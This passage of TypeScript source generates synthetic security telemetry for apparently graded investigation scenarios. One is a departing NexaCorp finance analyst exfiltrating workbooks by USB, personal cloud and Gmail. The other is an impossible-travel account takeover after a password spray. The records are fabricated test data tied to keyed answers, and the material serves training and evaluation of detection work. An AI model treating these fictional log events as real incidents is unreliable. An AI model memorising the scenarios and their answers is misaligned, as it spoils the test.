    { name: "Vendor_Bank_Details.xlsx",            size: 499_403,   site: "Finance", dlAt: 22 * MIN, usbAt: 12 * SEC },
  ];
  const fileHash = (n: string) => makeSha256(`insider_${n.toLowerCase()}`);

  // The interactive session the user works in: winlogon -> userinit -> explorer -> browser.
  const userinitProc = { name: "userinit.exe", pid: 1888, path: "C:\\Windows\\System32\\userinit.exe", parent_name: "winlogon.exe", parent_pid: 1020, cmdline: "C:\\Windows\\system32\\userinit.exe", user: "NEXACORP\\mtorres", integrity: "medium" as const };
  const explorerProc = { name: "explorer.exe", pid: 4212, path: "C:\\Windows\\explorer.exe", parent_name: "userinit.exe", parent_pid: 1888, cmdline: "C:\\Windows\\Explorer.EXE", user: "NEXACORP\\mtorres", integrity: "medium" as const };
  const chromePath = "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe";
  const chromeProc = { name: "chrome.exe", pid: 9120, path: chromePath, parent_name: "explorer.exe", parent_pid: 4212, cmdline: `"${chromePath}"`, user: "NEXACORP\\mtorres", integrity: "medium" as const };

  /** One SharePoint Online file operation as the Unified Audit Log writes it (one record per file). */
  const spRecord = (id: string, at: number, op: "FileAccessed" | "FileDownloaded", f: { name: string; site: string }, extra: Partial<TelemetryEvent> = {}): TelemetryEvent => ({
    id, ts: T(at),
    source: "o365", vendor: "Microsoft 365 Unified Audit Log", event_type: op === "FileDownloaded" ? "sharepoint_download" : "sharepoint_access",
    user_email: insider.email, src_ip: insider.ip,
    severity: "informational",
    description: `m.torres ${op === "FileDownloaded" ? "downloaded" : "opened"} ${f.name} on the ${f.site} SharePoint site.`,
    raw: {
      "data.office365.Operation": op,
      "data.office365.Workload": "SharePoint",
      "data.office365.SiteUrl": `https://nexacorp.sharepoint.com/sites/${f.site}`,
      "data.office365.SourceFileName": f.name,
      "data.office365.ResultStatus": "Succeeded",
    },
    ...extra,
  });
  /** The browser saving a downloaded workbook into Downloads. */
  const landing = (id: string, at: number, f: { name: string; size: number }): TelemetryEvent => ({
    id, ts: T(at),
    source: "edr", vendor: "CrowdStrike Falcon", event_type: "file_create",
    hostname: insider.hostname, user_email: insider.email, src_ip: insider.ip,
    severity: "informational",
    file: { path: `C:\\Users\\mtorres\\Downloads\\${f.name}`, sha256: fileHash(f.name), size: f.size },
    process: chromeProc,
    description: `chrome.exe saved ${f.name} to mtorres's Downloads folder on WS-FIN-4421.`,
    raw: { "crowdstrike.event_simpleName": "OoxmlFileWritten", "host.name": insider.hostname },
  });
  /** One workbook written to the USB drive by Explorer's copy. */
  const usbWrite = (id: string, f: { name: string; size: number; usbAt: number }, extra: Partial<TelemetryEvent> = {}): TelemetryEvent => ({
    id, ts: T(30 * MIN + f.usbAt),
    source: "edr", vendor: "CrowdStrike Falcon", event_type: "file_create",
    hostname: insider.hostname, user_email: insider.email, src_ip: insider.ip,
    severity: "medium",
    file: { path: `E:\\Finance_Backup\\${f.name}`, sha256: fileHash(f.name), size: f.size },
    process: explorerProc,
    description: `explorer.exe wrote ${f.name} to the E:\\Finance_Backup folder on the USB drive.`,
    raw: { "crowdstrike.event_simpleName": "OoxmlFileWritten", "host.name": insider.hostname },
    ...extra,
  });

  const events: TelemetryEvent[] = [
    {
      // ── The HR record the whole case turns on ───────────────────────────
      // The termination flag is q1's keyed answer. It comes from the system that owns it (the HR
      // system of record), so the finding is checkable rather than asserted.
      id: "evt_00_hr_lifecycle", ts: T(-45 * MIN),
      source: "hr", vendor: "Workday", event_type: "account_modify",
      user_email: insider.email,
      severity: "informational",
      description: "A worker lifecycle change was recorded for m.torres: employment end date set to the following day, initiated by HR Operations.",
      raw: {
        "workday.event_type": "Worker_Termination_Initiated",
        "workday.worker_id": "WD-0044812",
        "workday.worker_email": insider.email,
        "workday.termination_date": "2026-05-07",
        "workday.termination_reason_category": "Involuntary",
        "workday.initiated_by": "hr.operations@nexacorp.com",
        "workday.notice_period_active": "true",
        "workday.access_revocation_scheduled": "2026-05-07T18:00:00Z",
        "event.action": "Worker_Termination_Initiated",
        "event.outcome": "success",
      },
    },
    {
      id: "evt_01_context", ts: T(0),
      source: "ad", vendor: "Windows Security", event_type: "auth_success",
      hostname: insider.hostname, user_email: insider.email, src_ip: insider.ip,
      severity: "informational",
      description: "m.torres logged on to WS-FIN-4421 at 13:00.",
      raw: {
        // Windows Security Event 4624 - Successful Logon (pre-termination day)
        "winlog.event_id": "4624",
        "winlog.channel": "Security",
        "winlog.computer_name": "WS-FIN-4421",
        "winlog.provider_name": "Microsoft-Windows-Security-Auditing",
        "winlog.record_id": "2031174",
        // Subject (SYSTEM on interactive logon)
        "winlog.event_data.SubjectUserSid": "S-1-5-18",
        "winlog.event_data.SubjectUserName": "WS-FIN-4421$",
        "winlog.event_data.SubjectDomainName": "NEXACORP",
        "winlog.event_data.SubjectLogonId": "0x3E7",
        // New Logon
        "winlog.event_data.TargetUserSid": "S-1-5-21-3421479547-3897544621-1789562108-1309",
        "winlog.event_data.TargetUserName": "mtorres",
        "winlog.event_data.TargetDomainName": "NEXACORP",
        "winlog.event_data.TargetLogonId": "0x9C3E47",
        "winlog.event_data.LogonGuid": "{C3D4E5F6-A1B2-C3D4-E5F6-A1B2C3D4E5F6}",
        // Logon type and process
        "winlog.event_data.LogonType": "2",
        "winlog.event_data.LogonProcessName": "User32",
        "winlog.event_data.AuthenticationPackageName": "Kerberos",
        "winlog.event_data.WorkstationName": "WS-FIN-4421",
        "winlog.event_data.TransmittedServices": "-",
        "winlog.event_data.LmPackageName": "-",
        "winlog.event_data.KeyLength": "0",
        "winlog.event_data.ImpersonationLevel": "%%1833",
        "winlog.event_data.ElevatedToken": "%%1843",
        // Network / process
        "winlog.event_data.IpAddress": "10.10.20.91",
        "winlog.event_data.IpPort": "0",
        "winlog.event_data.ProcessId": "0x44C",
        "winlog.event_data.ProcessName": "C:\\Windows\\System32\\winlogon.exe",
        // ECS fields
        "event.code": "4624",
        "event.action": "logged-in",
        "event.outcome": "success",
        "event.created": "2026-05-06T13:00:00.000Z",
        "user.name": "NEXACORP\\mtorres",
        "user.email": "m.torres@nexacorp.com",
        "user.title": "Finance Analyst",
        "user.domain": "NEXACORP",
        "user.id": "S-1-5-21-3421479547-3897544621-1789562108-1309",
        "host.name": "WS-FIN-4421",
        "source.ip": "10.10.20.91",
        "authentication.protocol": "Kerberos",
        "authentication.status": "success",
        "logon.type": "2",
      },
    },
    // The session shell and the browser the user works in, so the process tree has real roots.
    {
      id: "evt_ins_01a_userinit", ts: T(6 * SEC),
      source: "edr", vendor: "CrowdStrike Falcon", event_type: "process_create",
      hostname: insider.hostname, user_email: insider.email, src_ip: insider.ip,
      severity: "informational",
      process: userinitProc,
      description: "userinit.exe started for m.torres's interactive session on WS-FIN-4421 after the logon.",
      raw: { "crowdstrike.event_simpleName": "ProcessRollup2", "host.name": insider.hostname },
    },
    {
      id: "evt_ins_01b_shell", ts: T(12 * SEC),
      source: "edr", vendor: "CrowdStrike Falcon", event_type: "process_create",
      hostname: insider.hostname, user_email: insider.email, src_ip: insider.ip,
      severity: "informational",
      process: explorerProc,
      description: "explorer.exe started for m.torres's interactive session on WS-FIN-4421.",
      raw: { "crowdstrike.event_simpleName": "ProcessRollup2", "host.name": insider.hostname },
    },
    {
      id: "evt_ins_01c_browser", ts: T(3 * MIN + 10 * SEC),
      source: "edr", vendor: "CrowdStrike Falcon", event_type: "process_create",
      hostname: insider.hostname, user_email: insider.email, src_ip: insider.ip,
      severity: "informational",
      process: chromeProc,
      description: "m.torres opened Chrome on WS-FIN-4421.",
      raw: { "crowdstrike.event_simpleName": "ProcessRollup2", "host.name": insider.hostname },
    },
    // Moved BEFORE the downloads/USB copy: the HR-site access precedes the download of the headcount plan.
    spRecord("evt_08_hr_access", 5 * MIN, "FileAccessed", { name: "Headcount_Reduction_Plan_Nov26.xlsx", site: "HR" },
      { severity: "medium", mitre_technique: "T1213.002", description: "m.torres, a Finance Analyst, opened the Restricted HR workbook Headcount_Reduction_Plan_Nov26.xlsx on the HR SharePoint site." }),

    // ── Collection: eight workbooks from the HR and Finance sites, each seen three times (cloud audit, proxy, disk) ──
    spRecord("evt_ins_dl_01", files[0].dlAt, "FileDownloaded", files[0]),
    landing("evt_ins_land_01", files[0].dlAt + 3 * SEC, files[0]),
    spRecord("evt_02_sp_start", files[1].dlAt, "FileDownloaded", files[1],
      { severity: "medium", mitre_technique: "T1213.002", description: "m.torres downloaded Q2-Vendor-Payments.xlsx from the Finance SharePoint site, the first of a run of downloads." }),
    landing("evt_ins_land_02", files[1].dlAt + 3 * SEC, files[1]),
    spRecord("evt_ins_dl_03", files[2].dlAt, "FileDownloaded", files[2]),
    {
      // The proxy's own record of one of the downloads (allowed: a sanctioned SharePoint tenant).
      id: "evt_ins_zia_sp", ts: T(files[2].dlAt + 2 * SEC),
      source: "proxy", vendor: "Zscaler Internet Access", event_type: "http_request",
      user_email: insider.email, src_ip: insider.ip, dst_ip: spoIp, dst_port: 443, protocol: "tcp",
      network: { url: `https://nexacorp.sharepoint.com/sites/Finance/Shared%20Documents/${files[2].name}`, domain: "nexacorp.sharepoint.com", method: "GET", status: 200, bytes_in: files[2].size, bytes_out: 1_388 },
      severity: "informational",
      description: "m.torres downloaded Employee_Salary_Master_2026.xlsx from nexacorp.sharepoint.com; Zscaler allowed the request.",
      raw: {
        "zscaler.action": "Allowed",
        "zscaler.login": "m.torres",
        "zscaler.url": `https://nexacorp.sharepoint.com/sites/Finance/Shared%20Documents/${files[2].name}`,
        "zscaler.hostname": "nexacorp.sharepoint.com",
        "zscaler.reqmethod": "GET",
        "zscaler.respsize": files[2].size,
        "zscaler.urlcategory": "Professional Services",
        "zscaler.appname": "Microsoft Office 365",
        "zscaler.cip": insider.ip,
        "source.hostname": insider.hostname,
      },
    },
    landing("evt_ins_land_03", files[2].dlAt + 4 * SEC, files[2]),
    spRecord("evt_ins_dl_04", files[3].dlAt, "FileDownloaded", files[3]),
    landing("evt_ins_land_04", files[3].dlAt + 3 * SEC, files[3]),
    spRecord("evt_ins_dl_05", files[4].dlAt, "FileDownloaded", files[4]),
    landing("evt_ins_land_05", files[4].dlAt + 4 * SEC, files[4]),
    spRecord("evt_ins_dl_06", files[5].dlAt, "FileDownloaded", files[5]),
    landing("evt_ins_land_06", files[5].dlAt + 3 * SEC, files[5]),
    spRecord("evt_ins_dl_07", files[6].dlAt, "FileDownloaded", files[6]),
    landing("evt_ins_land_07", files[6].dlAt + 3 * SEC, files[6]),
    spRecord("evt_ins_dl_08", files[7].dlAt, "FileDownloaded", files[7]),
    landing("evt_ins_land_08", files[7].dlAt + 3 * SEC, files[7]),

    {
      id: "evt_03_dlp_alert", ts: T(25 * MIN),
      source: "dlp", vendor: "Microsoft Purview", event_type: "dlp_alert",
      user_email: insider.email, src_ip: insider.ip,
      severity: "high", mitre_technique: "T1213.002",
      description: "Microsoft Purview DLP fired Finance-PII-Bulk-Download after m.torres downloaded 47 sensitive Finance files (18.2MB) in 15 minutes; policy action was notify-only.",
      raw: {
        "event.action": "DLP_PolicyTriggered", "event.outcome": "success",
        "user.email": "m.torres@nexacorp.com",
        "source.ip": "10.10.20.91",
        "policy.name": "Finance-PII-Bulk-Download",
        "policy.rule": "BulkAccessToSensitiveContent",
        "policy.action": "NotifyUser",
        "file.count": "47", "storage.size": "18.2 MB",
        "data.classification": "FinancialPII, HRConfidential",
        "action_result": "notified_not_blocked",
      },
    },

    // ── CORRELATED: UEBA alert - bulk download well above baseline ──────────────
    // The baseline is 11 files in a full day (evt_insider_baseline_files); 47 files in ~15 minutes
    // against 11 in 8 hours is roughly a 34x rate increase, which is what the alert states.
    {
      id: "evt_insider_ueba_alert", ts: T(25 * MIN + 30_000),
      source: "ueba", vendor: "Microsoft Sentinel UEBA",
      event_type: "ueba_anomaly", severity: "high",
      user_email: insider.email, src_ip: insider.ip,
      mitre_technique: "T1213.002",
      description: "Microsoft Sentinel flagged m.torres's SharePoint download rate as far above the 30-day norm: 47 sensitive files in about fifteen minutes against a baseline of roughly a dozen a day.",
      raw: {
        "event.action": "BehaviorAnomalyDetected",
        "event.outcome": "alerted",
        "user.email": insider.email,
        "MassDownloadActivity": "true",
        "behavior.name": "bulk_sharepoint_download",
        "behavior.score": "6.4",        // 0-10 investigation priority
        "anomaly.score": "89",          // 0-100 UEBA composite confidence
        "ActionUncommonlyPerformedByUser": "true",
        "source.ip": insider.ip,
      },
    },

    // ── Exfiltration 1: the USB drive ──────────────────────────────────────
    {
      id: "evt_04_usb_insert", ts: T(30 * MIN),
      source: "windows_security", vendor: "Windows Security", event_type: "privileged_operation",
      hostname: insider.hostname, src_ip: insider.ip,
      severity: "low",
      description: `A SanDisk Ultra USB drive (serial ${usbSerial}) was recognized by WS-FIN-4421 and mounted as E:\\.`,
      raw: {
        // Security 6416: "A new external device was recognized by the system."
        "winlog.event_id": "6416",
        "winlog.channel": "Security",
        "winlog.computer_name": "WS-FIN-4421",
        "winlog.provider_name": "Microsoft-Windows-Security-Auditing",
        "winlog.event_data.SubjectUserSid": "S-1-5-18",
        "winlog.event_data.SubjectUserName": "WS-FIN-4421$",
        "winlog.event_data.SubjectDomainName": "NEXACORP",
        "winlog.event_data.SubjectLogonId": "0x3E7",
        "winlog.event_data.DeviceId": `USBSTOR\\DISK&VEN_SANDISK&PROD_ULTRA&REV_1.00\\${usbSerial}&0`,
        "winlog.event_data.DeviceDescription": "Disk drive",
        "winlog.event_data.ClassId": "{4d36e967-e325-11ce-bfc1-08002be10318}",
        "winlog.event_data.ClassName": "DiskDrive",
        "winlog.event_data.VendorIds": "USBSTOR\\DiskSanDisk_Ultra_________1.00\n\t\tUSBSTOR\\DiskSanDisk_Ultra_________\n\t\tUSBSTOR\\SanDisk_Ultra_________1\n\t\tSanDisk_Ultra_________1\n\t\tGenDisk",
        "winlog.event_data.CompatibleIds": "USBSTOR\\Disk\n\t\tUSBSTOR\\RAW",
        "winlog.event_data.LocationInformation": "Port_#0003.Hub_#0002",
        "event.code": "6416",
      },
    },
    usbWrite("evt_05_more_files", files[2], { mitre_technique: "T1052.001", severity: "high",
      description: "explorer.exe on WS-FIN-4421 wrote Employee_Salary_Master_2026.xlsx to E:\\Finance_Backup on the USB drive, five seconds after the drive was mounted." }),
    usbWrite("evt_ins_usb_02", files[0]),
    usbWrite("evt_ins_usb_03", files[3]),
    usbWrite("evt_ins_usb_04", files[4]),
    usbWrite("evt_ins_usb_05", files[5]),
    usbWrite("evt_ins_usb_06", files[6]),
    usbWrite("evt_ins_usb_07", files[1]),
    usbWrite("evt_ins_usb_08", files[7]),
    {
      // The endpoint DLP rule for copies to removable media matched, and only audited.
      id: "evt_ins_dlp_usb", ts: T(30 * MIN + 14 * SEC),
      source: "dlp", vendor: "Microsoft Purview", event_type: "dlp_alert",
      hostname: insider.hostname, user_email: insider.email,
      severity: "medium", mitre_technique: "T1052.001",
      file: { path: "E:\\Finance_Backup\\Employee_Salary_Master_2026.xlsx", name: "Employee_Salary_Master_2026.xlsx" },
      description: "Endpoint DLP matched the removable-media rule on a copy of Employee_Salary_Master_2026.xlsx to E:\\ and audited it.",
      raw: {
        "event.action": "DlpEndpointActivity", "event.outcome": "success",
        "user.name": "NEXACORP\\mtorres",
        "policy.name": "Endpoint-DLP-Removable-Media-Copy",
        "policy.rule": "CopyRestrictedContentToRemovableMedia",
        "policy.action": "AuditAndNotify",
        "file.count": "8",
        "data.classification": "HRConfidential",
      },
    },

    // ── CORRELATED: Print event - m.torres printed sensitive docs too ─────────────
    {
      id: "evt_insider_print", ts: T(33 * MIN),
      source: "dlp", vendor: "Microsoft Purview",
      event_type: "dlp_alert", severity: "medium",
      hostname: insider.hostname, user_email: insider.email,
      description: "m.torres printed 3 files, including Headcount_Reduction_Plan_Nov26.xlsx, to the HP-FIN-FLOOR2 shared printer: flagged by endpoint DLP print-activity monitoring.",
      raw: {
        "event.action": "PrintJobSubmitted",
        "host.name": insider.hostname,
        "user.name": "NEXACORP\\mtorres",
        "printer.name": "HP-FIN-FLOOR2",
        "printer.share": "\\\\PRINT-SRV-01\\HP-FIN-FLOOR2",
        "print.job_count": "3",
        "print.file_name": "Headcount_Reduction_Plan_Nov26.xlsx",
        "print.pages": "47",
        "print.classification": "HRConfidential",
        "policy.name": "Endpoint-DLP-Print-Restricted-Content",
        "policy.action": "AuditAndNotify",
        "event.outcome": "success",
      },
    },

    // ── Exfiltration 2: the same eight workbooks, zipped and pushed at a personal bucket ──
    {
      id: "evt_ins_zip", ts: T(34 * MIN + 20 * SEC),
      source: "edr", vendor: "CrowdStrike Falcon", event_type: "file_create",
      hostname: insider.hostname, user_email: insider.email, src_ip: insider.ip,
      severity: "low", mitre_technique: "T1560",
      file: { path: "C:\\Users\\mtorres\\Downloads\\Finance_Backup.zip", sha256: zipHash, size: 9_812_445 },
      process: explorerProc,
      description: "explorer.exe on WS-FIN-4421 created Finance_Backup.zip (9.8 MB) in mtorres's Downloads folder.",
      raw: { "crowdstrike.event_simpleName": "ZipFileWritten", "host.name": insider.hostname },
    },
    {
      // The browser's connection for the upload goes to the Zscaler gateway, which inspects the body and blocks it.
      id: "evt_ins_chrome_net", ts: T(34 * MIN + 58 * SEC),
      source: "edr", vendor: "CrowdStrike Falcon", event_type: "net_connection",
      hostname: insider.hostname, user_email: insider.email, src_ip: insider.ip, dst_ip: zscalerNode, dst_port: 443, protocol: "tcp",
      network: { bytes_out: 9_812_445 },
      severity: "informational",
      process: chromeProc,
      description: "chrome.exe on WS-FIN-4421 sent 9.8 MB over HTTPS to the Zscaler gateway 165.225.38.11.",
      raw: { "crowdstrike.event_simpleName": "NetworkConnectIP4", "host.name": insider.hostname },
    },
    {
      id: "evt_06_cloud_block", ts: T(35 * MIN),
      source: "proxy", vendor: "Zscaler Internet Access", event_type: "http_request",
      user_email: insider.email, src_ip: insider.ip, dst_ip: gcsIp,
      dst_port: 443, protocol: "tcp",
      network: { url: "https://www.googleapis.com/upload/storage/v1/b/personal-backup-m/o", domain: "www.googleapis.com", method: "POST", bytes_out: 9_812_445 },
      severity: "high", mitre_technique: "T1567.002",
      description: "Zscaler blocked a 9.8MB upload of Finance_Backup.zip from WS-FIN-4421 to a personal Google Cloud Storage bucket.",
      raw: {
        "zscaler.action": "Blocked",
        "zscaler.reason": "DLP policy - Personal cloud upload blocked",
        "zscaler.login": "m.torres",
        "zscaler.url": "https://www.googleapis.com/upload/storage/v1/b/personal-backup-m/o",
        "zscaler.hostname": "www.googleapis.com",
        "zscaler.urlcategory": "Personal Cloud Storage",
        "zscaler.reqmethod": "POST",
        "zscaler.reqsize": 9812445,
        "zscaler.filename": "Finance_Backup.zip",
        "zscaler.filetype": "zip",
        "zscaler.cip": "10.10.20.91",
        "user.email": "m.torres@nexacorp.com",
        "source.hostname": "WS-FIN-4421",
        "policy.name": "Personal-Cloud-Upload-Block",
      },
    },

    // ── Exfiltration 3: email to a personal mailbox (delivered) ─────────────────
    {
      id: "evt_07_email_attach", ts: T(40 * MIN),
      source: "dlp", vendor: "Microsoft Purview", event_type: "email_sent",
      user_email: insider.email, src_ip: insider.ip,
      severity: "high", mitre_technique: "T1048.003",
      description: "m.torres emailed 3 payroll, bonus and commission files (4.5MB) to a personal Gmail address: DLP logged and notified but did not block the send.",
      raw: {
        "event.action": "EmailSent", "event.outcome": "success",
        "email.from.address": "m.torres@nexacorp.com",
        "email.to.address": "m.torres.backup@gmail.com",
        "email.subject": "FW: Finance Reports Q2",
        "email.direction": "outbound",
        "email.attachment.name": "Payroll_2026_Q1.xlsx, Bonus_Targets_2026.xlsx, Commission_Plan_2026.xlsx",
        "file.size": "4506300",
        "channel.type": "Email",
        "data.type": "Financial Data, HR Data",
        "policy.name": "Finance-PII-External-Email",
        "policy.action": "AuditAndNotify",
        "action_result": "delivered",
      },
    },
    {
      // The mail-flow record of the same message.
      id: "evt_ins_mailflow", ts: T(40 * MIN + 5 * SEC),
      source: "email_gateway", vendor: "Microsoft Defender for Office 365", event_type: "email_sent",
      severity: "informational",
      description: "Exchange Online delivered an outbound message from m.torres to m.torres.backup@gmail.com with 3 attachments.",
      raw: {
        "event.action": "EmailDelivered", "event.outcome": "success",
        "email.from.address": "m.torres@nexacorp.com",
        "email.to.address": "m.torres.backup@gmail.com",
        "email.subject": "FW: Finance Reports Q2",
        "email.attachment.name": "Payroll_2026_Q1.xlsx, Bonus_Targets_2026.xlsx, Commission_Plan_2026.xlsx",
        "email.direction": "outbound",
        "file.size": "4506300",
        "DeliveryLocation": "On-premises/external",
        "action_result": "delivered",
      },
    },

    // ── After: the job search, then the end of the shift ───────────────────────
    {
      id: "evt_09_browse", ts: T(75 * MIN),
      source: "proxy", vendor: "Zscaler Internet Access", event_type: "http_request",
      user_email: insider.email, src_ip: insider.ip,
      severity: "low",
      description: "m.torres browsed Indeed from WS-FIN-4421 during work hours.",
      raw: {
        "zscaler.action": "Allowed",
        "zscaler.login": "m.torres",
        "zscaler.hostname": "indeed.com",
        "zscaler.urlcategory": "Job Search",
        "zscaler.cip": "10.10.20.91",
        "user.email": "m.torres@nexacorp.com",
        "source.hostname": "WS-FIN-4421",
      },
    },
    {
      id: "evt_ins_browse_li", ts: T(75 * MIN + 20 * SEC),
      source: "proxy", vendor: "Zscaler Internet Access", event_type: "http_request",
      user_email: insider.email, src_ip: insider.ip,
      network: { url: "https://www.linkedin.com/jobs/search/", domain: "www.linkedin.com", method: "GET" },
      severity: "low",
      description: "m.torres browsed LinkedIn Jobs from WS-FIN-4421 during work hours.",
      raw: {
        "zscaler.action": "Allowed",
        "zscaler.login": "m.torres",
        "zscaler.hostname": "www.linkedin.com",
        "zscaler.urlcategory": "Job Search",
        "zscaler.cip": "10.10.20.91",
        "user.email": "m.torres@nexacorp.com",
        "source.hostname": "WS-FIN-4421",
      },
    },
    {
      id: "evt_ins_browse_gd", ts: T(76 * MIN + 5 * SEC),
      source: "proxy", vendor: "Zscaler Internet Access", event_type: "http_request",
      user_email: insider.email, src_ip: insider.ip,
      network: { url: "https://www.glassdoor.com/Job/index.htm", domain: "www.glassdoor.com", method: "GET" },
      severity: "low",
      description: "m.torres browsed Glassdoor from WS-FIN-4421 during work hours.",
      raw: {
        "zscaler.action": "Allowed",
        "zscaler.login": "m.torres",
        "zscaler.hostname": "www.glassdoor.com",
        "zscaler.urlcategory": "Job Search",
        "zscaler.cip": "10.10.20.91",
        "user.email": "m.torres@nexacorp.com",
        "source.hostname": "WS-FIN-4421",
      },
    },
    {
      id: "evt_10_logout", ts: T(3 * 60 * MIN),
      source: "ad", vendor: "Windows Security", event_type: "auth_success",
      hostname: insider.hostname, user_email: insider.email, src_ip: insider.ip,
      severity: "informational",
      description: "m.torres logged off WS-FIN-4421 at 16:00.",
      raw: {
        "event.code": "4634", "event.action": "logged-off", "event.outcome": "success",
        // Type 2 (interactive), matching the logon in evt_01.
        "logon.type": "2",
        "winlog.event_data.TargetLogonId": "0x9C3E47",
        "user.name": "NEXACORP\\mtorres",
        "host.name": "WS-FIN-4421", "source.ip": "10.10.20.91",
      },
    },

    // ── CORRELATED: Baseline - m.torres normal daily file access volume ───────────
    spRecord("evt_insider_baseline_files", -24 * 60 * MIN, "FileAccessed", { name: "Q1-Vendor-Payments.xlsx", site: "Finance" },
      { is_baseline: true, description: "m.torres accessed 11 Finance files over a full 8-hour day the day before." }),
  ];
  // Chronological: the integrity gate and the page both read the story in clock order.
  events.sort((a, b) => Date.parse(a.ts) - Date.parse(b.ts));

  return { title: "DLP download alert on a finance workstation", events, T, MIN, insider, zipHash };
}

/** Telemetry half of `buildImpossibleTravelScenario`: the events and the story title, no answer key. */
export function impossibleTravelScenarioEvents() {
  const B = new Date("2026-05-12T07:00:00Z").getTime();   // 09:00 Israel time
  const T = (ms: number) => new Date(B + ms).toISOString();
  const MIN = 60_000;

  const user  = { email: "k.taylor@nexacorp.com", name: "k.taylor", sid: "S-1-5-21-3421479547-3897544621-1789562108-1113" };
  const isrIp = "77.125.38.201";   // ISP: HOT Mobile — Tel Aviv, Israel
  const nigIp = "41.203.64.9";     // ISP: MTN Nigeria — Lagos, Nigeria (4,320 km away)
  const sessionId = "b6f1e2d3-7a84-4c19-9e52-1a0bcf33ee70"; // Entra session shared by the attacker's sign-in and the UAL rows

  const events: TelemetryEvent[] = [
    // ── Step 0: credential origin — password spray that finally succeeds ────────
    {
      id: "evt_imp_00_spray", ts: T(-28 * MIN),
      source: "o365", vendor: "Microsoft Entra ID",
      event_type: "auth_failure", severity: "medium",
      user_email: user.email, src_ip: nigIp,
      geo: { country: "Nigeria", city: "Lagos", latitude: 6.5244, longitude: 3.3792 },
      mitre_technique: "T1110.003",
      description: "k.taylor's account had a burst of failed Entra ID sign-ins from a Nigerian IP (error 50126, invalid password) before the successful sign-in.",
      raw: {
        "azure.signinlogs.properties.userPrincipalName": user.email,
        "azure.signinlogs.properties.ipAddress": nigIp,
        "azure.signinlogs.properties.appDisplayName": "Office 365 Exchange Online",
        "azure.signinlogs.properties.status.errorCode": 50126,
        "azure.signinlogs.properties.riskLevelDuringSignIn": "low",
        "azure.signinlogs.properties.riskState": "atRisk",
        "azure.signinlogs.properties.riskEventTypes_v2": ["unfamiliarFeatures"],
        "GeoLocation.country_name": "Nigeria",
        "GeoLocation.location.lat": 6.5244,
        "GeoLocation.location.lon": 3.3792,
        "event.action": "sign-in-failed",
        "event.outcome": "failure",
        "source.ip": nigIp,
      },
    },
    // ── Step 1: Normal Israeli login — baseline ────────────────────────────────
    {
      id: "evt_imp_01_baseline", is_baseline: true, ts: T(0),
      source: "vpn", vendor: "Palo Alto Networks PAN-OS",
      event_type: "vpn_login", severity: "informational",
      user_email: user.email,
      src_ip: isrIp,
      geo: { country: "Israel", city: "Tel Aviv", latitude: 32.0853, longitude: 34.7818 },
      description: "k.taylor connected to the VPN from Tel Aviv, Israel, on a registered device with MFA approved.",
      raw: {
        "event.action":                    "vpn_connected",
        "event.outcome":                   "success",
        "user.email":                      user.email,
        "source.ip":                       isrIp,
        "source.geo.country_name":         "Israel",
        "source.geo.city_name":            "Tel Aviv",
        "source.geo.location.lat":         "32.0853",
        "source.geo.location.lon":         "34.7818",
        "GeoLocation.country_name":        "Israel",
        "GeoLocation.city_name":           "Tel Aviv",
        "GeoLocation.location.lat":        32.0853,
        "GeoLocation.location.lon":        34.7818,
        "gp.tunnel_ip":                    "10.100.50.14",
        "gp.client_hostname":              "LT-DEV-0931",
        "gp.device_registered":            "true",
        "gp.auth_method":                  "Azure AD + MFA",
        "gp.mfa_result":                   "approved",
        "gp.gateway":                      "gw-nexacorp-tlv01",
        "gp.client_os":                    "Windows 11 22H2",
        "gp.session_id":                   "gp-sess-9a3f2b1c",
      },
    },

    // ── Step 2: VPN login from Nigeria — 4 minutes later — IMPOSSIBLE ─────────
    {
      id: "evt_imp_02_impossible", ts: T(4 * MIN),
      source: "vpn", vendor: "Palo Alto Networks PAN-OS",
      event_type: "vpn_login", severity: "high",
      user_email: user.email,
      src_ip: nigIp,
      geo: { country: "Nigeria", city: "Lagos", latitude: 6.5244, longitude: 3.3792 },
      mitre_technique: "T1078",
      description: "k.taylor's account connected to the VPN from Lagos, Nigeria, on an unregistered device.",
      raw: {
        "event.action":                    "vpn_connected",
        "event.outcome":                   "success",
        "user.email":                      user.email,
        "source.ip":                       nigIp,
        "source.geo.country_name":         "Nigeria",
        "source.geo.city_name":            "Lagos",
        "source.geo.location.lat":         "6.5244",
        "source.geo.location.lon":         "3.3792",
        "GeoLocation.country_name":        "Nigeria",
        "GeoLocation.city_name":           "Lagos",
        "GeoLocation.location.lat":        6.5244,
        "GeoLocation.location.lon":        3.3792,
        "gp.tunnel_ip":                    "10.100.50.77",
        "gp.client_hostname":              "UNKNOWN-DEVICE",
        "gp.device_registered":            "false",
        "gp.auth_method":                  "Azure AD",
        "gp.mfa_result":                   "not_required",   // MFA bypass — no push sent
        "gp.gateway":                      "gw-nexacorp-emea01",
        "gp.client_os":                    "Windows 10 1909",
        "gp.session_id":                   "gp-sess-4f7c9d2e",
      },
    },

    // ── Step 2b: the Entra sign-in to the GlobalProtect app — single factor, no MFA ─
    {
      id: "evt_imp_02b_vpnauth", ts: T(4 * MIN + 20_000),
      source: "o365", vendor: "Microsoft Entra ID",
      event_type: "auth_success", severity: "high",
      user_email: user.email, src_ip: nigIp,
      geo: { country: "Nigeria", city: "Lagos", latitude: 6.5244, longitude: 3.3792 },
      mitre_technique: "T1078",
      description: "k.taylor authenticated to the GlobalProtect VPN app through Entra ID from a Nigerian IP with a single factor (password only); Entra ID Protection rated the sign-in high risk (atypical travel).",
      raw: {
        "azure.signinlogs.properties.userPrincipalName": user.email,
        "azure.signinlogs.properties.ipAddress": nigIp,
        "azure.signinlogs.properties.appDisplayName": "GlobalProtect",
        "azure.signinlogs.properties.authenticationRequirement": "singleFactorAuthentication",
        "azure.signinlogs.properties.riskLevelDuringSignIn": "high",
        "azure.signinlogs.properties.riskState": "atRisk",
        "azure.signinlogs.properties.riskEventTypes_v2": ["unlikelyTravel"],
        "azure.signinlogs.properties.status.errorCode": 0,
        "GeoLocation.country_name": "Nigeria",
        "GeoLocation.location.lat": 6.5244,
        "GeoLocation.location.lon": 3.3792,
        "event.action": "logged-in",
        "event.outcome": "success",
        "source.ip": nigIp,
      },
    },

    // ── Step 3: O365 login from same Nigerian IP — Entra flags it high risk (impossible travel) ─
    {
      id: "evt_imp_03_o365", ts: T(6 * MIN),
      source: "o365", vendor: "Microsoft Entra ID",
      event_type: "auth_success", severity: "high",
      user_email: user.email,
      src_ip: nigIp, is_detection: true,
      geo: { country: "Nigeria", city: "Lagos", latitude: 6.5244, longitude: 3.3792 },
      mitre_technique: "T1078",
